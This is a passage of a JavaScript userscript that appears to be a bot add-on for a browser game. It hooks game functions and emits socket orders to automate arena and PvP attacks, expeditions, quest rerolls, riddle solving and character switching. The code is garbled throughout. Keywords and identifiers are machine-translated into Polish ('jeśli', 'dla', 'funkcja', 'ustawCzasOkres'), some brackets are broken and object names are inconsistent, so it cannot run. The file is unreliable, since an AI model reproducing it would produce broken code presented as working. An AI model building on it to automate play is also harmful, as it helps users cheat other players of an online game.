		    jeśli (ustaw != niezdefiniowane) {
			GRA.socket.emit('ga', {
			    a: 64,
			    typ: 2,
			    zestaw: zestaw
			});
		    }
		});

		$('#klawisz9').click(() => {
		    var keyEvent = jQuery.Event('keydown');
		    zdarzenie kluczowe.które = 57; // Kod klawisza '9'
		    $(document).trigger(wydarzeniekluczowe);
		});
            
                $('#klawiszq').click(() => {
                    GAME.map_move(6) //klawisz 'q'
                });
                $('#klawisze').click(() => {
                    GAME.map_move(5)// klawisz 'e'
                });
                $('#klawiszs').click(() => {
                    GAME.map_move(1) //klawisz 's'
                });
                $('#klawisza').click(() => {
                    GAME.map_move(8) //Klawisz 'a'
                });
                $('#klawiszd').click(() => {
                    GAME.map_move(7)//klawisz 'd'
                });
                $('#klawiszx').click(() => {
                    this.questProceed();
                    kom_clear();
                    GRA.executeIx();
                });
                $('#klawiszz').click(() => {
                    GAME.map_move(4)//klawisz 'z'
                });
                $('#klawiszc').click(() => {
                    GAME.map_move(3)//klawisz 'c'
                });
                $('#klawiszr').click(() => {
                    GAME.emitOrder({ a: 13, mob_num: GAME.field_mob_id, fo: GAME.map_options.ma })//klawisz 'r'
                });
                $('#klawiszy').click(() => {
                    GAME.emitOrder({a:444,max:GAME.spawner[0],ignore:GAME.spawner[1]})//klawisz 'y'
                });
                $('#klawiszv').click(() => {
                    GAME.emitOrder({ a: 7, zamówienie: 2, szybkie: 1, fo: GAME.map_options.ma })// klawisz 'v'
                });
                $('#klawiszqx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(6)
                        }, i * 130);
                    }
                });
                $('#klawiszwx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GAME.map_move(2) // klawisz 'w' x 3
                        }, i * 130);
                    }
                });
                $('#klawiszex3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(5)
                        }, i * 130);
                    }
                });
                $('#klawiszax3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(8)
                        }, i * 130);
                    }
                });
                $('#klawiszsx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(1)
                        }, i * 130);
                    }
                });
                $('#klawiszdx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(7)
                        }, i * 130);
                    }
                });
                $('#klawiszzx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(4)
                        }, i * 130);
                    }
                });
                $('#klawiszcx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GRA.mapa_ruch(3)
                        }, i * 130);
                    }
                });
                $('#klawiszvx3').click(() => {
                    dla (let i = 0; i < 5; i++) {
                        ustawCzasOkres(() => {
                            GAME.emitOrder({ a: 7, kolejność: 2, szybkie: 1, fo: GAME.map_options.ma })
                        }, i * 130);
                    }
                });
                $('#klawiszb5').click(() => {
                    this.pvpKill();
                });
                $('#klawiszn').click(() => {
                    to.użyjkompresora()
                });
            }
            przejdź do następnego znaku () {
                to.resetAFO();
                var charId = this.charactersManager.getNextCharId();
                GAME.emitOrder({ a: 2, char_id: charId });
            }
            przejdź do poprzedniego znaku ()
                to.resetAFO();
                var charId = this.charactersManager.getPreviousCharId();
                GAME.emitOrder({ a: 2, char_id: charId });
            }
            dostosujCurrentCharacterId() {
                var thisCharId = GRA.char_id;
                jeśli (this.charactersManager.currentCharacterId === niezdefiniowane) {
                    this.charactersManager.setCurrentCharacterId(thisCharId);
                    powrót;
                }
                jeśli (thisCharId != this.charactersManager.currentCharacterId) {
                    this.charactersManager.setCurrentCharacterId(thisCharId);
                }
            }
            zresetujAFO() {
                console.log("KWA_RESET_AFO: zresetuj wartości AFO");
                jeśli ($("#resp_Panel .resp_status").eq(0).hasClass("zielony")) {
                    $("#resp_Panel .resp_button.resp_resp").click();
                }
                jeśli ($("#pvp_Panel .pvp_status").eq(0).hasClass("zielony")) {
                    $("#pvp_Panel .pvp_button.pvp_pvp").click();
                }
                jeśli ($("#lpvm_Panel .lpvm_status").eq(0).hasClass("zielony")) {
                    $("#lpvm_Panel .lpvm_button.lpvm_lpvm").click();
                }
                jeśli ($("#res_Panel .res_status").eq(0).hasClass("zielony")) {
                    $("#res_Panel .res_button.res_res").click();
                }
                jeśli ($(".manage_autoExpeditions").eq(0).hasClass("kws_active_icon")) {
                    $(".manage_autoExpeditions").click();
                }
                ustawCzasOkres(() => {
                    console.log("KWA_RESET_AFO: zresetuj wartości turniejowe");
                    this.tourSigned = false;
                    this.tournamentCategory = niezdefiniowana;
                    this.newTournamentID = niezdefiniowane;
                }, 1000);
            }
        }
        const kws = nowy kwsv3(kwsLocalCharacters);
        GRA.komunikat2 = funkcja (kom) {
            if (this.koms.indexOf(kom) == -1) {
                jeśli (this.komc > 50) this.komc = 40;
                var ind = this.koms.push(kom) - 1;
                JQS.kcc.append(`<div class="kom" style="top:130px; width:480px;"><div class="close_kom" data-ind="${ind}"><b>X</b></div><div class="content">${kom</div></div>`);
                to.komc++;
                kom_close_bind();
            }
        }
        GRA.cached_data = funkcja () {
            var pos = $('#char_buffs').offset();
            pos.lewy -= 75;
            pos.top -= 75;
            this.char_buffs_pos = pos;
            jeśli (GAME.char_id != 0 && GAME.quick_opts.online_reward) {
                ustawCzasOkres(() => {
                    GRA.socket.emit('ga', {
                        a: 26,
                        typ: 1
                    });
                    ustawCzasOkres(() => {
                        $('#daily_reward').fadeOut();
                        kom_clear();
                    }, 400);
                (1800);
            }
            ustawCzasOkres(() => {
                jeśli (GAME.emp_wars.length < 3 i GAME.quick_opts.empire) {
                    ustawCzasOkres(() => {
                        kws.wojny2();
                    }, 300);
                }
            }, 1500);
            GRA.startLevel = GRA.char_data.level;
            GAME.startTime = Date.now();
            ustawCzasOkres(() => {
                jeśli (GAME.char_data.planetary == 0) {
                    ustawCzasOkres(() => {
                        GRA.socket.emit('ga', {
                            a: 39,
                            typ: 34
                        });
                    }, 300);
                }
            }, 1200);
            const emitCalls = [{
                a: 33,
                typ: 0
            }, {
                a: 49,
                typ: 0
            }, {
                a: 29,
                typ: 0
            },];
            niech cd = [300, 600, 900];
            emitCalls.forEach((dane, i) => {
                ustawCzasOkres(() => {
                    GRA.socket.emit('ga', dane);
                }, cd[i]);
            });
            $('#train_uptime').html(GAME.showTimer(GAME.char_data.train_ucd - GAME.getTime()));
            ustawCzasOkres(() => {
                jeśli (kws.check_act()) {
                    $("#secondary_char_stats .activities").click();
                }
            }, 1200);
            GRA.parseQuickOpts(1);
            kws.workers_info = [fałsz, fałsz];
            liczba_areny = 0;
            liczba_pvp = 0;
            ustawCzasOkres(() => {
                jeśli ((GRA.char_data.reborn == 4 || GRA.char_data.reborn == 5) && GRA.char_data.alt_transform_expiry < GRA.getTime()) {
                    GRA.socket.emit('ga', {
                        a: 18,
                        typ: 8,
                        identyfikator techniczny: 134
                    });
                }
            }, 5300);
        }
        GAME.parseQuickOpts = funkcja (newq_bar = false) {
            var opts = '';
            jeśli (this.quick_opts.tutorial) {
                this.tutorials = this.quick_opts.tutorial;
                opcje += `<img id="open_tuts" src="/gfx/layout/helper.png" class="qlink2 opcja" data-option="open_tuts" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab358</div>" />`;
                $.getJSON('/json/tutorial.json', funkcja (json) {
                    GRA.tutorial_data = json.tuts;
                    GRA.checkTutorial();
                });
            }
            jeśli (this.quick_opts.private_planet) opts += `<div class="option qlink priv" data-option="private_teleport" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab138</div>"></div>`;
            jeśli (this.quick_opts.teleport) optuje += `<div class="option qlink tele" data-option="use_teleport" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab140</div>"></div>`;
            jeśli (this.quick_opts.travel) opts += `<div class="option qlink trav" data-option="use_travel" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab141</div>"></div>`;
            jeśli (this.quick_opts.ssj) {
                opcje += `<div class="opcja qlink ssj${this.quick_opts.ssj[0] == "116" ? "_uio" : this.quick_opts.ssj[1]} show_qat" opcja-danych="użyj_transformacji" technologia-danych="${this.quick_opts.ssj[0]}"podpowiedź-danych" tytuł-oryginalny-danych="<div class=tt>${LNG.lab139</div>"></div>`;
                opcje += `<div id="quick_allTransformations"></div>`;
            }
            jeśli (this.quick_opts.online_reward) wybiera += `<div class="option qlink dail" data-option="daily_reward" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab176</div>"></div>`;
            jeśli (this.quick_opts.bless) opts += `<div class="select_page qlink bles" data-page="game_buffs" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab188</div>"></div>`;
            jeśli (this.quick_opts.sub && this.quick_opts.sub.length) opts += `<div class="opcja qlink subs" data-option="quick_use_subs" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab189</div>"></div>`;
            jeśli (this.quick_opts.senzus && this.quick_opts.senzus.length) {
                opts += `<div class="opcja qlink senz" data-option="quick_use_senzu" data-toggle="tooltip" data-original-title="<div class=tt>${LNG.lab190</div>"></div>`;
            }
            jeśli (this.quick_opts.imperium) {
                opcje += `<div class="select_page qlink emp${this.quick_opts.empire} empPos" data-page="game_empire" data-toggle="tooltip" data-original-title="<div class=tt>${LNG['empire' + this.quick_opts.empire]</div>"></div>`;
                opts += `<div class="go_to_emp_con"> <div class="qlink go_to_emp emp1" style="filter:hue-rotate(168deg);" emp="1" data-toggle="tooltip" data-original-title="<div class=tt>Wejdş na siedzibę</div>"></div> <div class="qlink go_to_emp emp2" style="filter:hue-rotate(168deg);" emp="2" data-toggle="tooltip" data-original-title="<div class=tt>Wejdş na siedzibę</div>"></div> <div class="qlink go_to_emp emp3" style="filter:hue-rotate(168deg);" emp="3" data-toggle="tooltip" data-original-title="<div class=tt>Wejdź na siedzibę</div>"></div> <div class="qlink go_to_emp emp4" style="filter:hue-rotate(168deg);" emp="4" data-toggle="tooltip" data-original-title="<div class=tt>Wejdź na siedzibę</div>"></div> </div>`;
            }
            jeśli (newq_bar || GAME.char_id) {
                opcja += '<br>';
                jeśli (GAME.clan_laws) {
                    opts += `<div class="option qlink priv" style="filter:hue-rotate(168deg);" data-option="clan_planet_travel" data-toggle="tooltip" data-original-title="<div class=tt>Planeta klanowa</div>"></div>`;
                }
                jeśli (GAME.char_data.klan_rent == 0) {
                    opts += `<div class="qlink get_titles_list" style="filter:hue-rotate(168deg);background-image: url('https://i.imgur.com/0eQCqBl.png');" data-toggle="tooltip" data-original-title="<div class=tt>Zmień tytuł‚</div>"></div>`;
                }
                opts += `<div class="qlink load_afo" style="filter:hue-rotate(168deg);background-image: url('https://i.imgur.com/P8sJgQz.png');" data-toggle="tooltip" data-original-title="<div class=tt>Załaduj AFO</div>"></div>`;
                opts += `<div class="qlink sideIcons manage_auto_abyss${kws.auto_abyss ? ' kws_active_icon' : ''}" style="filter:hue-rotate(168deg);background-image: url('https://i.imgur.com/j5eQv2B.png');display:block;top:-136px;position:absolute;" data-toggle="tooltip" data-original-title="<div class=tt>[Włacz / Wyłacz] Atak na Otchłanie</div>"></div>`;
                opts += `<div class="qlink sideIcons manage_auto_arena${kws.auto_arena ? ' kws_active_icon' : ''}" style="filter:hue-rotate(168deg);background-image: url('https://i.imgur.com/rAroNzD.png');display:block;top:-104px;position:absolute;" data-toggle="tooltip" data-original-title="<div class=tt>[WłĄcz / WyłĄcz] Atak na Arenie</div>"></div>`;
                opts += `<div class="qlink sideIcons manage_autoExpeditions${kws.autoExpeditions ? ' kws_active_icon' : ''}" style="filter:hue-rotate(168deg);background-image: url('https://i.imgur.com/uSMzLBb.png');display:block;top:-72px;position:absolute;" data-toggle="tooltip" data-original-title="<div class=tt>[Włacz / Wyłacz] Automatyczne Wyprawy</div>"></div>`;
                opcje += ` <div class="autoExpeCodes"> <div style="padding-left:8px;"> <label for="aeCodes" style="cursor:pointer;">KODY</label> <div class="newCheckbox"><input type="checkbox" id="aeCodes" name="aeCodes" ${kws.settings.aeCodes ? "checked" : ""} /><label for="aeCodes"></label></div> </div> </div>`;
            }
            $('#quick_bar').html(opts);
            jeśli (GAME.char_id && GAME.char_data.klan_rent === 0) {
                kws.listQts();
                jeśli ("imperium" w GAME.quick_opts) {
                    kws.goEmpPos();
                }
            }
            opcja_bind();
            narzędzie_bind();
            strona_powiązana();
        }
        GAME.parseTracker = funkcja (śledzenie) {
            GRA.socket.emit('ga', {
                a: 22,
                typ: 3
            });
            track.sort((a, b) => a.want.type - b.want.type);
            var con = '';
            niech zwykle_html_dsa = '';
            niech codzienne_html_dsa = '';
            niech main_quest = ``;
            var any = fałsz;
            jeśli (ścieżka && długość.ścieżki) {
                var len = długość utworu;
                for (var i = 0; i < len; i++) {
                    dowolny = prawda;
                    var qn = track[i].header;
                    jeśli (qn.length > 15) qn = qn.slice(0, 15) + '...';
                    niech attroqq = $(`#page_game_qb #qb_list #quest_log_tr${track[i].qb_id}`).find(`.qb_right:contains("[ Codzienne ]")`).length;
                    jeśli (ścieżka[i].m == 1) {
                        main_quest += `<div id="track_quest_${track[i].qb_id}" class="qtrack opcja" data-option="go_teleport" data-loc="${track[i].loc}"><div class="sep3"></div><b style="color:orange;">${qn</b> ${this.quest_want(track[i].want, track[i].qb_id)</div>`;
                    } w przeciwnym razie jeśli (attroqq == 1) {
                        codzienne_html_dsa += `<div id="track_quest_${track[i].qb_id}" class="qtrack option" data-option="go_teleport" data-loc="${track[i].loc}"><div class="sep2"></div><b style="color:#63aaff;" >${qn</b> ${this.quest_want(track[i].want, track[i].qb_id)</div>`;
                    } w przeciwnym razie {
                        zwykle_html_dsa += `<div id="track_quest_${track[i].qb_id}" class="qtrack option" data-option="go_teleport" data-loc="${track[i].loc}"><div class="sep2"></div><b>${qn</b> ${this.quest_want(track[i].want, track[i].qb_id)</div>`;
                    }
                }
            }
            jeśli (jakikolwiek) {
                con += codzienne_html_dsa;
                con += zwykle_html_dsa;
                $('#drag_con').html(`${main_quest}${con}`);
                $('#drag_con').removeClass('scroll');
                $('#quest_track_con').show();
                jeśli (!kws.settings.hide_tracker) {
                    $('#drag_con').show();
                } w przeciwnym razie {
                    $('#drag_con').hide();
                }
            } w przeciwnym razie {
                $('#quest_track_con').hide();
            }
            kws.markDaily();
        }
        GAME.getEmpDetails = funkcja (petd) {
            kws.findWorker(petd, (el) => {
                niech emp_local = parseInt(el.attr("data-emp_local"));
                el.after(`<button class="newBtn do_all_instances" data-emp="${petd.id}" data-emp_local="${emp_local}">Wykonaj wszystkie instancje</button>`);
            });
            var res = '<div class=ptt>';
            var nextp = this.employe_exp(petd.level + 1);
            res += '<img src=/gfx/employee/' + petd.type + '.png width=100 align=left /><b>' + petd.name + '</b><br /><b>' + LNG['emptyp' + petd.type] + '</b> - <b class=item' + petd.class + '>' + LNG['item_class' + petd.class] + '</b><br />' + LNG.lab1 + ': <b>' + this.dots(petd.level) + '</b><br />EXP: <b>' + this.dots(petd.exp) + ' / ' + this.dots(nextp) + '</b><br /><br /><b class=orange>' + LNG.lab286 + '</b><br />';
            res += LNG.lab313 + ': <b>' + petd.energy + '</b> / <b>' + petd.maxenergy + '</b><br />';
            jeśli (petd.qualified) res += '<b class=green>' + LNG.lab314 + '</b><br />';
            rozdzielczość += '</div>';
            zwróć res;
        }
        GAME.abbreviateNumber = funkcja (liczba, decPlaces = 2) {
            decPlaces = Math.pow(10, decPlaces);
            var abbrev = ["K", "M", "Mld", "B", "Bld", "T", "Quad", "Quin", "Sext", "Sep", "Oct", "Non ", "Dec", "Und", "Duo", "Tre", "Quat", "Quind", "Sexd", "Sept", "Octo", "Nove", "Vigi"];
            dla (var i = abbrev.length - 1; i >= 0; i--) {
                var rozmiar = Math.pow(10, (i + 1) * 3);
                jeśli (rozmiar <= liczba) {
                    liczba = Math.floor(liczba * decPlaces / rozmiar) / decPlaces;
                    jeśli ((liczba == 1000) && (i < abbrev.length - 1)) {
                        liczba = 1;
                        i++;
                    }
                    liczba += ' ' + skrót[i];
                    przerwa;
                }
            }
            numer zwrotu;
        }
        GRA.questAction = () => {
            jeśli (GRA.quest_action && GRA.quest_action_count < GRA.quest_action_max) {
                GRA.socket.emit('ga', {
                    a: 22,
                    typ: 7,
                    id: GAME.quest_action_qid,
                    cnt: GAME.quest_action_max
                });
            }
            ustawCzasOkres(() => {
                kws.markDaily();
            }, 100);
        }
        GRA.parseQuest = funkcja (res) {
            var quest = res.q_step;
            var con = '<div class="quest_win diff' + quest.difficulty + '"><div class="sekcja">' + quest.header + '</div><div class="option closeicon" data-option="close_quest"></div><div class="quest_desc scroll"><span class="qtitle">» ' + quest.title + '</span><hr />' + this.parseContent(quest.content).replaceAll('&player', '<b class="orange">' + this.char_data.name + '</b>').replaceAll('&Player', '<b class="orange">' + this.char_data.name + '</b>') + '</div>';
            var qrdy = prawda;
            zmienna conf = '';
            jeśli (quest.want) {
                var extr = '';
                zmn extr1 = '';
                var extr2 = '';
                zmn extr3 = '';
                jeśli (trudność zadania > 0) {
                    var ratio = this.getDiffQuestRatio(1, quest.difficulty);
                    jeśli (stosunek < 1) extr = '<span class="green"> - ' + (100 - stosunek * 100) + '% </span>';
                    w przeciwnym razie extr = '<span class="red"> + ' + (ratio * 100 - 100) + '% </span>';
                }
                jeśli (quest.can_roll) {
                    extr += '<div class="quest_roll option" data-option="quest_roll" data-qb_id="' + quest.qb_id + '" data-toggle="tooltip" data-original-title="<div class=tt>Losuj w trudnych zadaniach<br />Koszt: 1 Kostka do Gry</div>"></div>';
                    extr1 += '<div class="quest_roll1 option" data-option="quest_roll1" data-qb_id="' + quest.qb_id + '" data-toggle="tooltip" data-original-title="<div class=tt>Losuj -50%<br />Koszt: 1 Kostka do Gry</div>"></div>';
                    extr2 += '<div class="quest_roll2 option" data-option="quest_roll2" data-qb_id="' + quest.qb_id + '" data-toggle="tooltip" data-original-title="<div class=tt>Losuj 150% lub 200%<br />Koszt: 1 Kostka do Gry</div>"></div>';
                    extr3 += '<div class="quest_roll3 option" data-option="quest_roll3" data-qb_id="' + quest.qb_id + '" data-toggle="tooltip" data-original-title="<div class=tt>Losuj 200%<br />Koszt: 1 Kostka do Gry</div>"></div>';
                }
                con += '<div class="quest_desc">';
                qrdy = quest.want.is_met;
                con += '<div><b>' + LNG.lab18 + '</b>:<br />' + this.quest_want(quest.want, quest.qb_id, 1, quest.difficulty) + ' ' + extr + ' ' + extr1 + ' ' + extr2 + ' ' + extr3 + '</div>';
                jeśli (quest.time_limit) {
                    con += '<div>' + LNG.lab145 + ': ' + this.showTimer(quest.want.tl - this.getTime()) + '<button class="newBtn option" data-option="quest_try_again" data-qb_id="' + quest.qb_id + '">' + LNG.lab146 + '</button></div>';
                }
                con += '</div>';
            }
            jeśli (quest.nagroda) {
                var extr = '';
                jeśli (trudność zadania > 0) {
                    con += '<div class="quest_desc disabled"><b>' + LNG.lab452 + '</b>:<br />' + this.quest_prize(quest.prize) + '</div>';
                    var ratio = this.getDiffQuestRatio(0, quest.difficulty);
                    jeśli (stosunek < 1) extr = '<span class="red"> - ' + (100 - stosunek * 100) + '% </span>';
                    w przeciwnym razie extr = '<span class="green"> + ' + (ratio * 100 - 100) + '% </span>';
                    var ratio2 = this.getDiffQuestRatio(2, quest.difficulty);
                    if (ratio2 > 0) extr += '<span class="orange"> ' + współczynnik2 + '% szansy na Magicznä… Rudę</span>';
                    jeśli (quest.prize.type == 7 || quest.prize.type == 52 || quest.prize.type == 57) quest.prize.amount = parseInt(quest.prize.amount * ratio);
                    w przeciwnym razie quest.prize.id = parseInt(quest.prize.id * ratio);
                    jeśli (quest.prize.hasOwnProperty("exp")) quest.prize.exp = parseInt(quest.prize.exp * ratio);
                    jeśli (quest.prize.hasOwnProperty("add")) quest.prize.add = parseInt(quest.prize.add * ratio);
                    con += '<div class="quest_desc"><b>' + LNG.lab21 + '</b>:<br />' + this.quest_prize(quest.prize) + ' ' + extr + '</div>';
                } w przeciwnym razie {
                    con += `<div class="quest_desc"><b>${LNG.lab21</b>:<br />${this.quest_prize(quest.prize)} ${quest.prize.type === 40 ? kws.calcLVL(quest.prize.exp) : ""</div>`;
                }
                jeśli (quest.prize.type >= 99) conf = 'data-confirm="1"';
            }
            jeśli (qrdy) {
                con += '<button class="option ans" data-option="finish_quest" ' + conf + ' data-button="1" data-qb_id="' + quest.qb_id + '">' + quest.buttton1 + '</button>';
                jeśli (quest.buttton2) con += '<button class="option ans" data-option="finish_quest" data-button="2" data-qb_id="' + quest.qb_id + '">' + quest.buttton2 + '</button>';
                jeśli (quest.buttton3) con += '<button class="option ans" data-option="finish_quest" data-button="3" data-qb_id="' + quest.qb_id + '">' + quest.buttton3 + '</button>';
            }
            con += '</div>';
            JQS.qcc.html(con).show();
            opcja_bind();
            qaction_bind();
            główne_powiązanie_elementów_ekw();
            narzędzie_bind();
            jeśli (res.q_step.want.riddle) {
                kws.solveRiddle(res.q_step.want.riddle);
            }
            ustawCzasOkres(() => {
                jeśli (quest.difficulty != 6 && quest.difficulty != 5 && rzuć2 && JQS.qcc.is(":visible")) {
                    GRA.socket.emit('ga', {
                        a: 22,
                        typ: 12,
                        Identyfikator: quest.qb_id
                    });
                } w przeciwnym razie {
                    roll2 = fałsz;
                }
            }, 300);
            ustawCzasOkres(() => {
                jeśli (quest.difficulty != 6 && rzuć3 && JQS.qcc.is(":visible")) {
                    GRA.socket.emit('ga', {
                        a: 22,
                        typ: 12,
                        Identyfikator: quest.qb_id
                    });
                } w przeciwnym razie {
                    roll3 = fałsz;
                }
            }, 300);
            ustawCzasOkres(() => {
                jeśli (quest.difficulty != 1 && rzuć1 && JQS.qcc.is(":visible")) {
                    GRA.socket.emit('ga', {
                        a: 22,
                        typ: 12,
                        Identyfikator: quest.qb_id
                    });
                } w przeciwnym razie {
                    roll1 = fałsz;
                }
            }, 300);
        };
        GAME.endQuest = funkcja (quest_end) {
            JQS.qcc.ukryj();
            $('#field_q_' + quest_end).fadeOut();
            dla (var ind w this.map_quests) {
                jeśli (this.map_quests.hasOwnProperty(ind)) {
                    var len = this.map_quests[ind].length;
                    for (var i = 0; i < len; i++) {
                        jeśli (this.map_quests[ind][i].qb_id == koniec_questu) {
                            this.map_quests[ind][i].koniec = 1;
                        }
                    }
                }
            }
            jeśli (GAME.map_quests) {
                kws.parseMapInfo(GRA.map_quests, "GRA.endQuest");
            }
        };
        GAME.moveQuest = funkcja (quest_move) {
            jeśli (this.char_data.loc == quest_move.loc) {
                JQS.qcc.ukryj();
                $('#field_q_' + quest_move.qb_id).fadeOut();
                dla (var ind w this.map_quests) {
                    jeśli (this.map_quests.hasOwnProperty(ind)) {
                        var len = this.map_quests[ind].length;
                        for (var i = 0; i < len; i++) {
                            jeśli (this.map_quests[ind][i].qb_id == quest_move.qb_id) {
                                this.map_quests[ind][i].move = {
                                    nowy_x: quest_move.x,
                                    nowy_y: quest_move.y,
                                    początek: this.getmTime(),
                                    Czas trwania: 300
                                };
                            }
                        }
                    }
                }
                jeśli (GAME.map_quests) {
                    kws.parseMapInfo(GRA.map_quests, "GRA.moveQuest");
                }
            } w przeciwnym razie this.endQuest(quest_move.qb_id);
        };
        GRA.parseLocBons = funkcja (loc_data) {
            kws.parseMapInfo(GAME.map_quests, "GAME.parseLocBons");
            var bons = '';
            jeśli (loc_data.bonus_tren) bonusy += '<img src="/gfx/icons/loc_bon/tren.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_tren + '</b>' + LNG.item_stat15 + '</div>" />';
            jeśli (loc_data.bonus_exp) bonusy += '<img src="/gfx/icons/loc_bon/exp.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_exp + '</b>' + LNG.item_stat16 + '</div>" />';
            jeśli (loc_data.bonus_mocc) bonusy += '<img src="/gfx/icons/loc_bon/mc.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocc + '</b>' + LNG.item_stat53 + '</div>" />';
            jeśli (loc_data.bonus_mocv) bonusy += '<img src="/gfx/icons/loc_bon/mv.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocv + '</b>' + LNG.item_stat54 + '</div>" />';
            jeśli (loc_data.bonus_legend) bonusy += '<img src="/gfx/icons/loc_bon/l.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_legend + '</b>' + LNG.item_stat74 + '</div>" />';
            jeśli (loc_data.bonus_psk) bonusy += '<img src="/gfx/icons/loc_bon/p.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_psk + '</b>' + LNG.item_stat67 + '</div>" />';
            jeśli (loc_data.bonus_senzu) bonusy += '<img src="/gfx/icons/loc_bon/s.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_senzu + '</b>' + LNG.item_stat78 + '</div>" />';
            bony zwrotne;
        };
        GAME.emit = funkcja (kolejność, dane, siła) {
            jeśli (!this.is_loading || wymuś) {
                to.load_start();
                this.socket.emit(zamówienie, dane);
            } else if (this.debug) console.log('nieudane zamówienie', zamówienie, dane);
        };
        GAME.emitOrder = funkcja (dane, siła = fałsz) {
            this.emit('ga', dane, siła);
        };
        GRA.initiate = funkcja () {
            $('#player_login').text(this.login);
            $('#game_win').show();
            jeśli (this.char_id == 0 && this.pid > 0) {
                to.emitOrder({
                    a: 1
                });
            }
            var len = długość tego.serwera,
                con = '';
            for (var i = 0; i < len; i++) {
                con += '<wartość opcji="' + this.servers[i] + '">' + LNG['serwer' + this.servers[i]] + '</option>';
            }
            $('#available_servers').html(con);
            $('#available_servers opcja[wartość=' + this.server + ']').prop('selected', true);
        };
        const kulka = nowy ballManager();
        niech adimp = fałsz;
        niech arena_count = 0;
        niech pvp_count = 0;
        niech roll2 = fałsz;
        niech roll1 = fałsz;
        niech roll3 = fałsz;
        niech wersja = '3.5.1 PREMIUM (3.4.6 standard)';
    }
    )
}
	
